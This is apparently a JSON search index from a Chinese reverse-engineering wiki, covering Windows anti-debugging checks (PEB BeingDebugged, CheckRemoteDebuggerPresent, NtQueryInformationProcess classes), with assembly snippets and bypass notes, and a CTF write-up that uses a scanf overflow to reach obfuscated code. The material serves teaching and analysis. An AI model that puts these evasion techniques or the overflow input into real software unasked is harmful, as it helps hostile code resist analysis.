eax ,   fs :[ 30 h ]   ;Process Environment Block  ;64-bit Process Environment Block  ;follows 32-bit Process Environment Block  cmp   b   [ eax + 1002 h ],   0   ;check BeingDebugged  jne   being_debugged", 
            "title": "\u68c0\u6d4b\u4ee3\u7801"
        }, 
        {
            "location": "/reverse/anti-debug/isdebuggerpresent/#_2", 
            "text": "\u60f3\u8981\u514b\u670d\u8fd9\u4e9b\u68c0\u6d4b, \u53ea\u9700\u8981\u5c06 BeingDebugged \u6807\u5fd7\u8bbe\u4e3a 0 \u5373\u53ef(\u6216\u6539\u53d8\u4e00\u4e0b\u8fd4\u56de\u503c).", 
            "title": "\u5982\u4f55\u7ed5\u8fc7"
        }, 
        {
            "location": "/reverse/anti-debug/checkremotedebuggerpresent/", 
            "text": "\u5173\u4e8eCheckRemoteDebuggerPresent\n\n\nkernel32\n\u7684\nCheckRemoteDebuggerPresent()\n\u51fd\u6570\u7528\u4e8e\u68c0\u6d4b\u6307\u5b9a\u8fdb\u7a0b\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5. \nRemote\n\u5728\u5355\u8bcd\u91cc\u662f\u6307\u540c\u4e00\u4e2a\u673a\u5668\u4e2d\u7684\u4e0d\u540c\u8fdb\u7a0b. \n\n\nBOOL\n \nWINAPI\n \nCheckRemoteDebuggerPresent\n(\n\n  \n_In_\n    \nHANDLE\n \nhProcess\n,\n\n  \n_Inout_\n \nPBOOL\n  \npbDebuggerPresent\n\n\n);\n\n\n\n\n\n\u5982\u679c\u8c03\u8bd5\u5668\u5b58\u5728(\u901a\u5e38\u662f\u68c0\u6d4b\u81ea\u5df1\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5), \u8be5\u51fd\u6570\u4f1a\u5c06\npbDebuggerPresent\n\u6307\u5411\u7684\u503c\u8bbe\u4e3a\n0xffffffff\n. \n\n\n\u68c0\u6d4b\u4ee3\u7801\n\n\n\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4d\u73af\u5883\n\n\npush\n \neax\n\n\npush\n \nesp\n\n\npush\n \n-\n1\n \n;GetCurrentProcess()\n\n\ncall\n \nCheckRemoteDebuggerPresent\n\n\npop\n \neax\n\n\ntest\n \neax\n,\n \neax\n\n\njne\n \nbeing_debugged\n\n\n\n\n\n\u621664\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\n\n\nenter\n \n20\nh\n,\n \n0\n\n\nmov\n \nedx\n,\n \nebp\n\n\nor\n \nrcx\n,\n \n-\n1\n \n;GetCurrentProcess()\n\n\ncall\n \nCheckRemoteDebuggerPresent\n\n\nleave\n\n\ntest\n \nebp\n,\n \nebp\n\n\njne\n \nbeing_debugged\n\n\n\n\n\n\u5982\u4f55\u7ed5\u8fc7\n\n\n\u6bd4\u5982\u6709\u5982\u4e0b\u7684\u4ee3\u7801\n\n\nint\n \nmain\n(\nint\n \nargc\n,\n \nchar\n \n*\nargv\n[])\n\n\n{\n\n    \nBOOL\n \nisDebuggerPresent\n \n=\n \nFALSE\n;\n\n    \nif\n \n(\nCheckRemoteDebuggerPresent\n(\nGetCurrentProcess\n(),\n \nisDebuggerPresent\n \n))\n\n    \n{\n\n        \nif\n \n(\nisDebuggerPresent\n \n)\n\n        \n{\n\n            \nstd\n::\ncout\n \n \nStop debugging program!\n \n \nstd\n::\nendl\n;\n\n            \nexit\n(\n-\n1\n);\n\n        \n}\n\n    \n}\n\n    \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\nisDebuggerPresent\n\u7684\u503c\u6216\u4fee\u6539\u8df3\u8f6c\u6761\u4ef6\u6765\u7ed5\u8fc7(\u6ce8\u610f\u4e0d\u662f\nCheckRemoteDebuggerPresent\n\u7684izhi, \u5b83\u7684\u8fd4\u56de\u503c\u662f\u7528\u4e8e\u8868\u793a\u51fd\u6570\u662f\u5426\u6b63\u786e\u6267\u884c). \n\n\n\u4f46\u5982\u679c\u8981\u9488\u5bf9\nCheckRemoteDebuggerPresent\n\u8fd9\u4e2aapi\u51fd\u6570\u8fdb\u884c\u4fee\u6539\u7684\u8bdd. \u9996\u5148\u8981\u77e5\u9053\nCheckRemoteDebuggerPresent\n\u5185\u90e8\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528\nNtQueryInformationProcess\n\u6765\u5b8c\u6210\u529f\u80fd\u7684. \u800c\u6211\u4eec\u5c31\u9700\u8981\u5bf9\nNtQueryInformationProcess\n\u7684\u8fd4\u56de\u503c\u8fdb\u884c\u4fee\u6539. \u6211\u4eec\u5c06\u5728\n NtQueryInformationProcess \u7bc7\n\u8fdb\u884c\u4ecb\u7ecd.", 
            "title": "CheckRemoteDebuggerPresent"
        }, 
        {
            "location": "/reverse/anti-debug/checkremotedebuggerpresent/#checkremotedebuggerpresent", 
            "text": "kernel32 \u7684 CheckRemoteDebuggerPresent() \u51fd\u6570\u7528\u4e8e\u68c0\u6d4b\u6307\u5b9a\u8fdb\u7a0b\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5.  Remote \u5728\u5355\u8bcd\u91cc\u662f\u6307\u540c\u4e00\u4e2a\u673a\u5668\u4e2d\u7684\u4e0d\u540c\u8fdb\u7a0b.   BOOL   WINAPI   CheckRemoteDebuggerPresent ( \n   _In_      HANDLE   hProcess , \n   _Inout_   PBOOL    pbDebuggerPresent  );   \u5982\u679c\u8c03\u8bd5\u5668\u5b58\u5728(\u901a\u5e38\u662f\u68c0\u6d4b\u81ea\u5df1\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5), \u8be5\u51fd\u6570\u4f1a\u5c06 pbDebuggerPresent \u6307\u5411\u7684\u503c\u8bbe\u4e3a 0xffffffff .", 
            "title": "\u5173\u4e8eCheckRemoteDebuggerPresent"
        }, 
        {
            "location": "/reverse/anti-debug/checkremotedebuggerpresent/#_1", 
            "text": "\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4d\u73af\u5883  push   eax  push   esp  push   - 1   ;GetCurrentProcess()  call   CheckRemoteDebuggerPresent  pop   eax  test   eax ,   eax  jne   being_debugged   \u621664\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883  enter   20 h ,   0  mov   edx ,   ebp  or   rcx ,   - 1   ;GetCurrentProcess()  call   CheckRemoteDebuggerPresent  leave  test   ebp ,   ebp  jne   being_debugged", 
            "title": "\u68c0\u6d4b\u4ee3\u7801"
        }, 
        {
            "location": "/reverse/anti-debug/checkremotedebuggerpresent/#_2", 
            "text": "\u6bd4\u5982\u6709\u5982\u4e0b\u7684\u4ee3\u7801  int   main ( int   argc ,   char   * argv [])  { \n     BOOL   isDebuggerPresent   =   FALSE ; \n     if   ( CheckRemoteDebuggerPresent ( GetCurrentProcess (),   isDebuggerPresent   )) \n     { \n         if   ( isDebuggerPresent   ) \n         { \n             std :: cout     Stop debugging program!     std :: endl ; \n             exit ( - 1 ); \n         } \n     } \n     return   0 ;  }   \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 isDebuggerPresent \u7684\u503c\u6216\u4fee\u6539\u8df3\u8f6c\u6761\u4ef6\u6765\u7ed5\u8fc7(\u6ce8\u610f\u4e0d\u662f CheckRemoteDebuggerPresent \u7684izhi, \u5b83\u7684\u8fd4\u56de\u503c\u662f\u7528\u4e8e\u8868\u793a\u51fd\u6570\u662f\u5426\u6b63\u786e\u6267\u884c).   \u4f46\u5982\u679c\u8981\u9488\u5bf9 CheckRemoteDebuggerPresent \u8fd9\u4e2aapi\u51fd\u6570\u8fdb\u884c\u4fee\u6539\u7684\u8bdd. \u9996\u5148\u8981\u77e5\u9053 CheckRemoteDebuggerPresent \u5185\u90e8\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528 NtQueryInformationProcess \u6765\u5b8c\u6210\u529f\u80fd\u7684. \u800c\u6211\u4eec\u5c31\u9700\u8981\u5bf9 NtQueryInformationProcess \u7684\u8fd4\u56de\u503c\u8fdb\u884c\u4fee\u6539. \u6211\u4eec\u5c06\u5728  NtQueryInformationProcess \u7bc7 \u8fdb\u884c\u4ecb\u7ecd.", 
            "title": "\u5982\u4f55\u7ed5\u8fc7"
        }, 
        {
            "location": "/reverse/anti-debug/ntqueryinformationprocess/", 
            "text": "NTSTATUS\n \nWINAPI\n \nNtQueryInformationProcess\n(\n\n  \n_In_\n      \nHANDLE\n           \nProcessHandle\n,\n\n  \n_In_\n      \nPROCESSINFOCLASS\n \nProcessInformationClass\n,\n\n  \n_Out_\n     \nPVOID\n            \nProcessInformation\n,\n\n  \n_In_\n      \nULONG\n            \nProcessInformationLength\n,\n\n  \n_Out_opt_\n \nPULONG\n           \nReturnLength\n\n\n);\n\n\n\n\n\nProcessDebugPort\n\n\n\u672a\u516c\u5f00\u7684\nntdll\n\u7684\nNtQueryInformationProcess()\n\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4fe1\u606f\u7c7b\u7684\u53c2\u6570\u7528\u4e8e\u67e5\u8be2. \nProcessDebugPort(7)\n\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u4fe1\u606f\u7c7b. \nkernel32\n\u7684\nCheckRemoteDebuggerPresent()\n\u51fd\u6570\u5185\u90e8\u901a\u8fc7\u8c03\u7528\nNtQueryInformationProcess()\n\u6765\u68c0\u6d4b\u8c03\u8bd5, \u800c\nNtQueryInformationProcess\n\u5185\u90e8\u5219\u662f\u67e5\u8be2\nEPROCESS\n\u7ed3\u6784\u4f53\u7684\nDebugPort\n\u5b57\u6bb5, \u5f53\u8fdb\u7a0b\u6b63\u5728\u88ab\u8c03\u8bd5\u65f6, \u8fd4\u56de\u503c\u4e3a\n0xffffffff\n. \n\n\n\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:\n\n\npush\n \neax\n\n\nmov\n \neax\n,\n \nesp\n\n\npush\n \n0\n\n\npush\n \n4\n \n;ProcessInformationLength\n\n\npush\n \neax\n\n\npush\n \n7\n \n;ProcessDebugPort\n\n\npush\n \n-\n1\n \n;GetCurrentProcess()\n\n\ncall\n \nNtQueryInformationProcess\n\n\npop\n \neax\n\n\ninc\n \neax\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:\n\n\nxor\n \nebp\n,\n \nebp\n\n\nenter\n \n20\nh\n,\n \n0\n\n\npush\n \n8\n \n;ProcessInformationLength\n\n\npop\n \nr9\n\n\npush\n \nrbp\n\n\npop\n \nr8\n\n\npush\n \n7\n \n;ProcessDebugPort\n\n\npop\n \nrdx\n\n\nor\n \nrcx\n,\n \n-\n1\n \n;GetCurrentProcess()\n\n\ncall\n \nNtQueryInformationProcess\n\n\nleave\n\n\ntest\n \nebp\n,\n \nebp\n\n\njne\n \nbeing_debugged\n\n\n\n\n\n\u7531\u4e8e\u4fe1\u606f\u4f20\u81ea\u5185\u6838, \u6240\u4ee5\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u4ee3\u7801\u6ca1\u6709\u8f7b\u677e\u7684\u65b9\u6cd5\u963b\u6b62\u8be5\u51fd\u6570\u68c0\u6d4b\u8c03\u8bd5\u5668. \n\n\nProcessDebugObjectHandle\n\n\nWindows XP\u5f15\u5165\u4e86\ndebug\u5bf9\u8c61\n, \u5f53\u4e00\u4e2a\u8c03\u8bd5\u4f1a\u8bdd\u542f\u52a8, \u4f1a\u540c\u65f6\u521b\u5efa\u4e00\u4e2a\ndebug\n\u5bf9\u8c61\u4ee5\u53ca\u4e0e\u4e4b\u5173\u8054\u7684\u53e5\u67c4. \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\nProcessDebugObjectHandle (0x1e)\n\u7c7b\u6765\u67e5\u8be2\u8fd9\u4e2a\u53e5\u67c4\u7684\u503c\n\n\n\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:\n\n\npush\n \n0\n\n\nmov\n \neax\n,\n \nesp\n\n\npush\n \n0\n\n\npush\n \n4\n \n;ProcessInformationLength\n\n\npush\n \neax\n\n\npush\n \n1\neh\n \n;ProcessDebugObjectHandle\n\n\npush\n \n-\n1\n \n;GetCurrentProcess()\n\n\ncall\n \nNtQueryInformationProcess\n\n\npop\n \neax\n\n\ntest\n \neax\n,\n \neax\n\n\njne\n \nbeing_debugged\n\n\n\n\n\n\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:\n\n\nxor\n \nebp\n,\n \nebp\n\n\nenter\n \n20\nh\n,\n \n0\n\n\npush\n \n8\n \n;ProcessInformationLength\n\n\npop\n \nr9\n\n\npush\n \nrbp\n\n\npop\n \nr8\n\n\npush\n \n1\neh\n \n;ProcessDebugObjectHandle\n\n\npop\n \nrdx\n\n\nor\n \nrcx\n,\n \n-\n1\n \n;GetCurrentProcess()\n\n\ncall\n \nNtQueryInformationProcess\n\n\nleave\n\n\ntest\n \nebp\n,\n \nebp\n\n\njne\n \nbeing_debugged\n\n\n\n\n\nProcessDebugFlags\n\n\nProcessDebugFlags (0x1f)\n\u7c7b\u8fd4\u56de\nEPROCESS\n\u7ed3\u6784\u4f53\u7684\nNoDebugInherit\n\u7684\u76f8\u53cd\u6570. \u610f\u601d\u662f, \u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, \u8fd4\u56de\u503c\u4e3a\n0\n, \u4e0d\u5b58\u5728\u65f6\u5219\u8fd4\u56de\n1\n. \n\n\n\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:\n\n\npush\n \neax\n\n\nmov\n \neax\n,\n \nesp\n\n\npush\n \n0\n\n\npush\n \n4\n \n;ProcessInformationLength\n\n\npush\n \neax\n\n\npush\n \n1\nfh\n \n;ProcessDebugFlags\n\n\npush\n \n-\n1\n \n;GetCurrentProcess()\n\n\ncall\n \nNtQueryInformationProcess\n\n\npop\n \neax\n\n\ntest\n \neax\n,\n \neax\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:\n\n\nxor\n \nebp\n,\n \nebp\n\n\nenter\n \n20\nh\n,\n \n0\n\n\npush\n \n4\n \n;ProcessInformationLength\n\n\npop\n \nr9\n\n\npush\n \nrbp\n\n\npop\n \nr8\n\n\npush\n \n1\nfh\n \n;ProcessDebugFlags\n\n\npop\n \nrdx\n\n\nor\n \nrcx\n,\n \n-\n1\n \n;GetCurrentProcess()\n\n\ncall\n \nNtQueryInformationProcess\n\n\nleave\n\n\ntest\n \nebp\n,\n \nebp\n\n\nje\n \nbeing_debugged", 
            "title": "NtQueryInformationProcess"
        }, 
        {
            "location": "/reverse/anti-debug/ntqueryinformationprocess/#processdebugport", 
            "text": "\u672a\u516c\u5f00\u7684 ntdll \u7684 NtQueryInformationProcess() \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4fe1\u606f\u7c7b\u7684\u53c2\u6570\u7528\u4e8e\u67e5\u8be2.  ProcessDebugPort(7) \u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u4fe1\u606f\u7c7b.  kernel32 \u7684 CheckRemoteDebuggerPresent() \u51fd\u6570\u5185\u90e8\u901a\u8fc7\u8c03\u7528 NtQueryInformationProcess() \u6765\u68c0\u6d4b\u8c03\u8bd5, \u800c NtQueryInformationProcess \u5185\u90e8\u5219\u662f\u67e5\u8be2 EPROCESS \u7ed3\u6784\u4f53\u7684 DebugPort \u5b57\u6bb5, \u5f53\u8fdb\u7a0b\u6b63\u5728\u88ab\u8c03\u8bd5\u65f6, \u8fd4\u56de\u503c\u4e3a 0xffffffff .   \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:  push   eax  mov   eax ,   esp  push   0  push   4   ;ProcessInformationLength  push   eax  push   7   ;ProcessDebugPort  push   - 1   ;GetCurrentProcess()  call   NtQueryInformationProcess  pop   eax  inc   eax  je   being_debugged   \u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:  xor   ebp ,   ebp  enter   20 h ,   0  push   8   ;ProcessInformationLength  pop   r9  push   rbp  pop   r8  push   7   ;ProcessDebugPort  pop   rdx  or   rcx ,   - 1   ;GetCurrentProcess()  call   NtQueryInformationProcess  leave  test   ebp ,   ebp  jne   being_debugged   \u7531\u4e8e\u4fe1\u606f\u4f20\u81ea\u5185\u6838, \u6240\u4ee5\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u4ee3\u7801\u6ca1\u6709\u8f7b\u677e\u7684\u65b9\u6cd5\u963b\u6b62\u8be5\u51fd\u6570\u68c0\u6d4b\u8c03\u8bd5\u5668.", 
            "title": "ProcessDebugPort"
        }, 
        {
            "location": "/reverse/anti-debug/ntqueryinformationprocess/#processdebugobjecthandle", 
            "text": "Windows XP\u5f15\u5165\u4e86 debug\u5bf9\u8c61 , \u5f53\u4e00\u4e2a\u8c03\u8bd5\u4f1a\u8bdd\u542f\u52a8, \u4f1a\u540c\u65f6\u521b\u5efa\u4e00\u4e2a debug \u5bf9\u8c61\u4ee5\u53ca\u4e0e\u4e4b\u5173\u8054\u7684\u53e5\u67c4. \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ProcessDebugObjectHandle (0x1e) \u7c7b\u6765\u67e5\u8be2\u8fd9\u4e2a\u53e5\u67c4\u7684\u503c  \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:  push   0  mov   eax ,   esp  push   0  push   4   ;ProcessInformationLength  push   eax  push   1 eh   ;ProcessDebugObjectHandle  push   - 1   ;GetCurrentProcess()  call   NtQueryInformationProcess  pop   eax  test   eax ,   eax  jne   being_debugged   \u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:  xor   ebp ,   ebp  enter   20 h ,   0  push   8   ;ProcessInformationLength  pop   r9  push   rbp  pop   r8  push   1 eh   ;ProcessDebugObjectHandle  pop   rdx  or   rcx ,   - 1   ;GetCurrentProcess()  call   NtQueryInformationProcess  leave  test   ebp ,   ebp  jne   being_debugged", 
            "title": "ProcessDebugObjectHandle"
        }, 
        {
            "location": "/reverse/anti-debug/ntqueryinformationprocess/#processdebugflags", 
            "text": "ProcessDebugFlags (0x1f) \u7c7b\u8fd4\u56de EPROCESS \u7ed3\u6784\u4f53\u7684 NoDebugInherit \u7684\u76f8\u53cd\u6570. \u610f\u601d\u662f, \u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, \u8fd4\u56de\u503c\u4e3a 0 , \u4e0d\u5b58\u5728\u65f6\u5219\u8fd4\u56de 1 .   \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:  push   eax  mov   eax ,   esp  push   0  push   4   ;ProcessInformationLength  push   eax  push   1 fh   ;ProcessDebugFlags  push   - 1   ;GetCurrentProcess()  call   NtQueryInformationProcess  pop   eax  test   eax ,   eax  je   being_debugged   \u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b:  xor   ebp ,   ebp  enter   20 h ,   0  push   4   ;ProcessInformationLength  pop   r9  push   rbp  pop   r8  push   1 fh   ;ProcessDebugFlags  pop   rdx  or   rcx ,   - 1   ;GetCurrentProcess()  call   NtQueryInformationProcess  leave  test   ebp ,   ebp  je   being_debugged", 
            "title": "ProcessDebugFlags"
        }, 
        {
            "location": "/reverse/anti-debug/junk-code/", 
            "text": "\u539f\u7406\n\n\n\u82b1\u6307\u4ee4\u662f\u4f01\u56fe\u9690\u85cf\u6389\u4e0d\u60f3\u88ab\u9006\u5411\u5de5\u7a0b\u7684\u4ee3\u7801\u5757(\u6216\u5176\u5b83\u529f\u80fd)\u7684\u4e00\u79cd\u65b9\u6cd5, \u5728\u771f\u5b9e\u4ee3\u7801\u4e2d\u63d2\u5165\u4e00\u4e9b\u5783\u573e\u4ee3\u7801\u7684\u540c\u65f6\u8fd8\u4fdd\u8bc1\u539f\u6709\u7a0b\u5e8f\u7684\u6b63\u786e\u6267\u884c, \u800c\u7a0b\u5e8f\u65e0\u6cd5\u5f88\u597d\u5730\u53cd\u7f16\u8bd1, \u96be\u4ee5\u7406\u89e3\u7a0b\u5e8f\u5185\u5bb9, \u8fbe\u5230\u6df7\u6dc6\u89c6\u542c\u7684\u6548\u679c.\n\n\n\u4f8b\u9898\n\n\n\u8fd9\u91cc\u4ee5\n\u770b\u96ea.TSRC 2017CTF\u79cb\u5b63\u8d5b\n\u7b2c\u4e8c\u9898\u4f5c\u4e3a\u8bb2\u89e3. \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5: \nctf2017_Fpc.exe\n\n\n\u7a0b\u5e8f\u5199\u4e86\u51e0\u4e2a\u51fd\u6570\u6df7\u6dc6\u89c6\u542c, \u5c06\u5173\u952e\u7684\u9a8c\u8bc1\u903b\u8f91\u52a0\u82b1\u6307\u4ee4\u9632\u6b62\u4e86IDA\u7684\u9759\u6001\u5206\u6790. \u6211\u4eec\u7528IDA\u6253\u5f00Fpc\u8fd9\u9053\u9898, \u7a0b\u5e8f\u4f1a\u5148\u6253\u5370\u4e00\u4e9b\u63d0\u793a\u4fe1\u606f, \u7136\u540e\u83b7\u53d6\u7528\u6237\u7684\u8f93\u5165.\n\n\n\n\n\u8fd9\u91cc\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684\nscanf\n\u51fd\u6570, \u7528\u6237\u8f93\u5165\u7684\u7f13\u51b2\u533a\u53ea\u6709\n0xCh\n\u957f, \u6211\u4eec\u53cc\u51fb\nv1\n\u8fdb\u5165\u6808\u5e27\u89c6\u56fe\n\n\n\n\n\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fa\u6570\u636e, \u8986\u76d6\u6389\u8fd4\u56de\u5730\u5740, \u4ece\u800c\u8f6c\u79fb\u5230\u4efb\u610f\u5730\u5740\u7ee7\u7eed\u6267\u884c. \n\n\n\u8fd9\u91cc\u6211\u8fd8\u9700\u8981\u89e3\u91ca\u4e00\u4e0b, \u5c31\u662f\nscanf\n\u4e4b\u524d\u5199\u7684\u51e0\u4e2a\u6df7\u6dc6\u89c6\u542c\u7684\u51fd\u6570, \u662f\u4e00\u4e9b\u7b80\u5355\u7684\u65b9\u7a0b\u5f0f\u4f46\u5b9e\u9645\u4e0a\u662f\u65e0\u89e3\u7684. \u7a0b\u5e8f\u5c06\u771f\u6b63\u7684\u9a8c\u8bc1\u903b\u8f91\u52a0\u82b1\u6df7\u6dc6, \u5bfc\u81f4IDA\u65e0\u6cd5\u5f88\u597d\u7684\u8fdb\u884c\u53cd\u7f16\u8bd1. \u6240\u4ee5\u6211\u4eec\u8fd9\u9053\u9898\u7684\u601d\u8def\u5c31\u662f, \u901a\u8fc7\u6ea2\u51fa\u8f6c\u5230\u771f\u6b63\u7684\u9a8c\u8bc1\u4ee3\u7801\u5904\u7ee7\u7eed\u6267\u884c. \n\n\n\u6211\u4eec\u5728\u5206\u6790\u65f6\u53ef\u4ee5\u5728\u4ee3\u7801\u4e0d\u8fdc\u5904\u53d1\u73b0\u4ee5\u4e0b\u6570\u636e\u5757.\n\n\n\n\n\u56e0\u4e3aIDA\u6ca1\u80fd\u5f88\u597d\u7684\u8bc6\u522b\u6570\u636e, \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c06\u5149\u6807\u79fb\u5230\u6570\u636e\u5757\u7684\u8d77\u59cb\u4f4d\u7f6e, \u7136\u540e\u6309\u4e0b\nC\n\u952e(code)\u5c06\u8fd9\u5757\u6570\u636e\u53cd\u6c47\u7f16\u6210\u4ee3\u7801\n\n\n\n\n\u503c\u5f97\u6ce8\u610f\u7684\u662f, \u8fd9\u6bb5\u4ee3\u7801\u7684\u4f4d\u7f6e\u662f\n0x00413131\n, \n0x41\n\u662f\n'A'\n\u7684ascii\u7801\uff0c\u800c\n0x31\n\u662f\n'1'\n\u7684ascii\u7801. \u7531\u4e8e\u770b\u96ea\u6bd4\u8d5b\u7684\u9650\u5236, \u7528\u6237\u8f93\u5165\u53ea\u80fd\u662f\u5b57\u6bcd\u548c\u6570\u5b57, \u6240\u4ee5\u6211\u4eec\u4e5f\u5b8c\u5168\u53ef\u4ee5\u5229\u7528\u6ea2\u51fa\u6f0f\u6d1e\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\n\n\n\u7528OD\u6253\u5f00, \u7136\u540e\nCtrl+G\n\u5230\u8fbe\n0x413131\n\u5904\u8bbe\u4e0b\u65ad\u70b9, \u8fd0\u884c\u540e\u8f93\u5165\n12345612345611A\n\u56de\u8f66, \u7a0b\u5e8f\u6210\u529f\u5730\u5230\u8fbe\n0x00413131\n\u5904. \u7136\u540e\n\u53f3\u952e\u5206\u6790-\n\u4ece\u6a21\u5757\u4e2d\u5220\u9664\u5206\u6790\n\u8bc6\u522b\u51fa\u6b63\u786e\u4ee3\u7801\n\n\n\n\n\u65ad\u5728\n0x413131\n\u5904\u540e, \u70b9\u51fb\u83dc\u5355\u680f\u7684\n\u67e5\u770b\n, \u9009\u62e9\nRUN\u8ddf\u8e2a\n, \u7136\u540e\u518d\u70b9\u51fb\n\u8c03\u8bd5\n, \u9009\u62e9\n\u8ddf\u8e2a\u6b65\u5165\n, \u7a0b\u5e8f\u4f1a\u8bb0\u5f55\u8fd9\u6bb5\u82b1\u6307\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b, \u5982\u4e0b\u56fe\u6240\u793a:\n\n\n\n\n\u8fd9\u6bb5\u82b1\u6307\u4ee4\u672c\u6765\u5f88\u957f, \u4f46\u662f\u4f7f\u7528OD\u7684\u8ddf\u8e2a\u529f\u80fd\u540e, \u82b1\u6307\u4ee4\u7684\u6267\u884c\u6d41\u7a0b\u5c31\u975e\u5e38\u6e05\u695a. \u6574\u4e2a\u8fc7\u7a0b\u4e2d\u8fdb\u884c\u4e86\u5927\u91cf\u7684\u8df3\u8f6c, \u6211\u4eec\u53ea\u8981\u53d6\u5176\u4e2d\u7684\u6709\u6548\u6307\u4ee4\u62ff\u51fa\u6765\u5206\u6790\u5373\u53ef.\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f, \u5728\u6709\u6548\u6307\u4ee4\u4e2d, \u6211\u4eec\u4f9d\u65e7\u8981\u6ee1\u8db3\u4e00\u4e9b\u6761\u4ef6\u8df3\u8f6c, \u8fd9\u6837\u7a0b\u5e8f\u624d\u80fd\u5728\u6b63\u786e\u7684\u903b\u8f91\u4e0a\u4e00\u76f4\u6267\u884c\u4e0b\u53bb. \n\n\n\u6bd4\u5982\n0x413420\n\u5904\u7684\njnz ctf2017_.00413B03\n. \u6211\u4eec\u5c31\u8981\u91cd\u65b0\u6765\u8fc7, \u5e76\u5728\n0x413420\n\u8bbe\u4e0b\u65ad\u70b9\n\n\n\n\n\u901a\u8fc7\u4fee\u6539\u6807\u5fd7\u5bc4\u5b58\u5668\u6765\u6ee1\u8db3\u8df3\u8f6c. \u7ee7\u7eed\u8ddf\u8e2a\u6b65\u5165(\u4e4b\u540e\u8fd8\u6709\n0041362E  jnz ctf2017_.00413B03\n\u9700\u8981\u6ee1\u8db3). \u4fdd\u8bc1\u903b\u8f91\u6b63\u786e\u540e, \u5c06\u6709\u6548\u6307\u4ee4\u53d6\u51fa\u7ee7\u7eed\u5206\u6790\u5c31\u597d\u4e86", 
            "title": "\u82b1\u6307\u4ee4"
        }, 
        {
            "location": "/reverse/anti-debug/junk-code/#_1", 
            "text": "\u82b1\u6307\u4ee4\u662f\u4f01\u56fe\u9690\u85cf\u6389\u4e0d\u60f3\u88ab\u9006\u5411\u5de5\u7a0b\u7684\u4ee3\u7801\u5757(\u6216\u5176\u5b83\u529f\u80fd)\u7684\u4e00\u79cd\u65b9\u6cd5, \u5728\u771f\u5b9e\u4ee3\u7801\u4e2d\u63d2\u5165\u4e00\u4e9b\u5783\u573e\u4ee3\u7801\u7684\u540c\u65f6\u8fd8\u4fdd\u8bc1\u539f\u6709\u7a0b\u5e8f\u7684\u6b63\u786e\u6267\u884c, \u800c\u7a0b\u5e8f\u65e0\u6cd5\u5f88\u597d\u5730\u53cd\u7f16\u8bd1, \u96be\u4ee5\u7406\u89e3\u7a0b\u5e8f\u5185\u5bb9, \u8fbe\u5230\u6df7\u6dc6\u89c6\u542c\u7684\u6548\u679c.", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/reverse/anti-debug/junk-code/#_2", 
